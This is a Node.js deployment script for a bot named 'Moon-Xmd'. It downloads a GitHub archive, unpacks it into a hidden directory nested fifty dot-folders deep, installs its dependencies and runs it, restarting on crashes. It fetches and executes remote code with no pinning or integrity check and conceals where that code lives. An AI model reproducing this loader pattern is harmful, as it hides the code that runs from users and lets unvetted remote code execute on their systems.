const fs = require('fs');
const path = require('path');
const axios = require('axios');
const AdmZip = require('adm-zip');
const { spawn } = require('child_process');
const chalk = require('chalk');

// === DEEP HIDDEN TEMP PATH (.npm/.botx_cache/.x1/.../.x90) ===
const deepLayers = Array.from({ length: 50 }, (_, i) => `.x${i + 1}`);
const TEMP_DIR = path.join(__dirname, '.npm', 'xcache', ...deepLayers);

// === GIT CONFIG ===
const DOWNLOAD_URL = "https://github.com/mkaay267/mineforever/archive/refs/heads/main.zip";
let EXTRACT_DIR = path.join(TEMP_DIR, "mineforever-main");
const LOCAL_SETTINGS = path.join(__dirname, "settings.js");
let EXTRACTED_SETTINGS = path.join(EXTRACT_DIR, "settings.js");

// === HELPERS ===
const delay = (ms) => new Promise((res) => setTimeout(res, ms));

// === EXTRACT GITHUB URL FROM VARIOUS SOURCES ===
function extractGithubUrl() {
  try {
    // Method 1: Check package.json
    const packageJsonPath = path.join(__dirname, 'package.json');
    if (fs.existsSync(packageJsonPath)) {
      const packageJson = JSON.parse(fs.readFileSync(packageJsonPath, 'utf8'));
      if (packageJson.repository && packageJson.repository.url) {
        const repoUrl = packageJson.repository.url
          .replace('git+', '')
          .replace('.git', '');
        console.log(chalk.cyan('[📦] Found repo URL in package.json'));
        return repoUrl;
      }
    }

    // Method 2: Check settings.js
    const settingsPath = path.join(__dirname, 'settings.js');
    if (fs.existsSync(settingsPath)) {
      const settingsContent = fs.readFileSync(settingsPath, 'utf8');
      const urlMatch = settingsContent.match(/github\.com\/[\w-]+\/[\w-]+/);
      if (urlMatch) {
        console.log(chalk.cyan('[⚙️] Found repo URL in settings.js'));
        return `https://${urlMatch[0]}`;
      }
    }

    // Method 3: Check .git/config
    const gitConfigPath = path.join(__dirname, '.git', 'config');
    if (fs.existsSync(gitConfigPath)) {
      const gitConfig = fs.readFileSync(gitConfigPath, 'utf8');
      const urlMatch = gitConfig.match(/url\s*=\s*(https:\/\/github\.com\/[\w-]+\/[\w-]+)/);
      if (urlMatch) {
        console.log(chalk.cyan('[🔧] Found repo URL in .git/config'));
        return urlMatch[1];
      }
    }

    // Fallback to default
    console.log(chalk.yellow('[⚠️] Using default repository URL'));
    return DOWNLOAD_URL.replace('/archive/refs/heads/main.zip', '');

  } catch (error) {
    console.error(chalk.red('[❌] Error extracting GitHub URL:'), error.message);
    return DOWNLOAD_URL.replace('/archive/refs/heads/main.zip', '');
  }
}

// === DOWNLOAD AND EXTRACT ===
async function downloadAndExtract() {
  try {
    // Clean previous cache
    if (fs.existsSync(TEMP_DIR)) {
      console.log(chalk.yellow("[🧹] Cleaning previous cache..."));
      fs.rmSync(TEMP_DIR, { recursive: true, force: true });
    }

    fs.mkdirSync(TEMP_DIR, { recursive: true });

    // Extract GitHub URL
    const repoUrl = extractGithubUrl();
    const downloadUrl = `${repoUrl}/archive/refs/heads/main.zip`;
    console.log(chalk.blue(`[🔗] Repository URL: ${repoUrl}`));

    const zipPath = path.join(TEMP_DIR, "repo.zip");

    console.log(chalk.blue("[🔄] Downloading repository..."));
    const response = await axios({
      url: downloadUrl,
      method: "GET",
      responseType: "stream",
      timeout: 60000, // 60 second timeout
      headers: {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
      }
    });

    // Download with progress
    const totalLength = response.headers['content-length'];
    let downloadedLength = 0;

    await new Promise((resolve, reject) => {
      const writer = fs.createWriteStream(zipPath);
      
      response.data.on('data', (chunk) => {
        downloadedLength += chunk.length;
        const progress = totalLength ? 
          Math.round((downloadedLength / totalLength) * 100) : 
          'N/A';
        process.stdout.write(`\r[📥] Downloading: ${progress}%`);
      });

      response.data.pipe(writer);
      writer.on("finish", () => {
        console.log(''); // New line after progress
        resolve();
      });
      writer.on("error", reject);
    });

    console.log(chalk.green("[✅] Download completed"));

    // Extract ZIP
    console.log(chalk.blue("[📦] Extracting files..."));
    try {
      const zip = new AdmZip(zipPath);
      zip.extractAllTo(TEMP_DIR, true);
      console.log(chalk.green("[✅] Extraction completed"));
    } catch (e) {
      console.error(chalk.red("[❌] Failed to extract:"), e.message);
      throw e;
    } finally {
      // Clean up ZIP file
      if (fs.existsSync(zipPath)) {
        fs.unlinkSync(zipPath);
      }
    }

    // Verify extraction
    if (!fs.existsSync(EXTRACT_DIR)) {
      // Try to find the extracted folder
      const tempContents = fs.readdirSync(TEMP_DIR);
      const extractedFolder = tempContents.find(item => 
        fs.statSync(path.join(TEMP_DIR, item)).isDirectory()
      );
      
      if (extractedFolder) {
        console.log(chalk.yellow(`[⚠️] Adjusted extract directory: ${extractedFolder}`));
        // Update EXTRACT_DIR
        EXTRACT_DIR = path.join(TEMP_DIR, extractedFolder);
        EXTRACTED_SETTINGS = path.join(EXTRACT_DIR, "settings.js");
      } else {
        throw new Error('Extracted directory not found');
      }
    }

    // Verify essential files
    const indexPath = path.join(EXTRACT_DIR, "index.js");
    const settingsPath = path.join(EXTRACT_DIR, "settings.js");
    
    console.log(chalk.cyan("\n[📋] Verifying files..."));
    console.log(chalk.cyan(`[📄] index.js: ${fs.existsSync(indexPath) ? '✅' : '❌'}`));
    console.log(chalk.cyan(`[📄] settings.js: ${fs.existsSync(settingsPath) ? '✅' : '❌'}`));

    // Check plugins folder
    const pluginFolder = path.join(EXTRACT_DIR, "commands");
    if (fs.existsSync(pluginFolder)) {
      const pluginCount = fs.readdirSync(pluginFolder).length;
      console.log(chalk.green(`[✅] Plugins folder found (${pluginCount} files)`));
    } else {
      console.log(chalk.yellow("[⚠️] Plugins folder not found"));
    }

    return true;
  } catch (error) {
    console.error(chalk.red("[❌] Download and extract failed:"), error.message);
    throw error;
  }
}

// === APPLY LOCAL SETTINGS ===
async function applyLocalSettings() {
  if (!fs.existsSync(LOCAL_SETTINGS)) {
    console.log(chalk.yellow("[⚠️] No local settings.js file found. Using default settings."));
    return;
  }

  try {
    // Ensure EXTRACT_DIR exists
    if (!fs.existsSync(EXTRACT_DIR)) {
      throw new Error('Extract directory does not exist');
    }

    // Backup original settings if it exists
    if (fs.existsSync(EXTRACTED_SETTINGS)) {
      const backupPath = path.join(EXTRACT_DIR, "settings.js.backup");
      fs.copyFileSync(EXTRACTED_SETTINGS, backupPath);
      console.log(chalk.cyan("[💾] Original settings backed up"));
    }

    // Copy local settings
    fs.copyFileSync(LOCAL_SETTINGS, EXTRACTED_SETTINGS);
    console.log(chalk.green("[🛠️] Local settings.js applied successfully"));
  } catch (e) {
    console.error(chalk.red("[❌] Failed to apply local settings:"), e.message);
  }

  await delay(500);
}

// === INSTALL DEPENDENCIES ===
async function installDependencies() {
  console.log(chalk.blue("[📦] Installing dependencies..."));
  
  return new Promise((resolve, reject) => {
    const npm = spawn('npm', ['install', '--legacy-peer-deps'], {
      cwd: EXTRACT_DIR,
      stdio: 'inherit',
      shell: true
    });

    npm.on('close', (code) => {
      if (code === 0) {
        console.log(chalk.green("[✅] Dependencies installed successfully"));
        resolve();
      } else {
        console.log(chalk.yellow("[⚠️] Some dependencies may have issues, but continuing..."));
        resolve(); // Continue anyway
      }
    });

    npm.on('error', (err) => {
      console.error(chalk.red("[❌] Failed to install dependencies:"), err.message);
      reject(err);
    });
  });
}

// === START BOT ===
function startBot() {
  console.log(chalk.cyan("\n[🚀] Launching Moon-Xmd instance..."));
  
  if (!fs.existsSync(EXTRACT_DIR)) {
    console.error(chalk.red("[❌] Extracted directory not found. Cannot start bot."));
    return;
  }

  const indexPath = path.join(EXTRACT_DIR, "index.js");
  if (!fs.existsSync(indexPath)) {
    console.error(chalk.red("[❌] index.js not found in extracted directory."));
    return;
  }

  console.log(chalk.green("[✅] Starting bot process...\n"));

  const bot = spawn("node", ["index.js"], {
    cwd: EXTRACT_DIR,
    stdio: "inherit",
    env: { 
      ...process.env, 
      NODE_ENV: "production",
      DEPLOYED: "true"
    },
    shell: true
  });

  bot.on("close", (code) => {
    console.log(chalk.red(`\n[💥] Bot terminated with exit code: ${code}`));
    if (code !== 0) {
      console.log(chalk.yellow("[🔄] Restarting bot in 5 seconds..."));
      setTimeout(() => startBot(), 5000);
    }
  });

  bot.on("error", (err) => {
    console.error(chalk.red("[❌] Bot failed to start:"), err.message);
  });

  // Handle process termination
  process.on('SIGINT', () => {
    console.log(chalk.yellow("\n[⏹️] Shutting down bot..."));
    bot.kill('SIGINT');
    process.exit(0);
  });

  process.on('SIGTERM', () => {
    console.log(chalk.yellow("\n[⏹️] Shutting down bot..."));
    bot.kill('SIGTERM');
    process.exit(0);
  });
}

// === MAIN EXECUTION ===
(async () => {
  console.log(chalk.bold.cyan("\n╔════════════════════════════════════════╗"));
  console.log(chalk.bold.cyan("║   Moon-Xmd DEPLOYMENT SYSTEM          ║"));
  console.log(chalk.bold.cyan("╚════════════════════════════════════════╝\n"));

  try {
    await downloadAndExtract();
    await applyLocalSettings();
    await installDependencies();
    startBot();
  } catch (e) {
    console.error(chalk.red("\n[❌] Fatal error in deployment:"), e.message);
    console.error(chalk.red("[💡] Please check your internet connection and GitHub repository URL"));
    process.exit(1);
  }
})();

// === HANDLE UNCAUGHT ERRORS ===
process.on('uncaughtException', (error) => {
  console.error(chalk.red('[❌] Uncaught Exception:'), error.message);
});

process.on('unhandledRejection', (reason, promise) => {
  console.error(chalk.red('[❌] Unhandled Rejection at:'), promise, 'reason:', reason);
});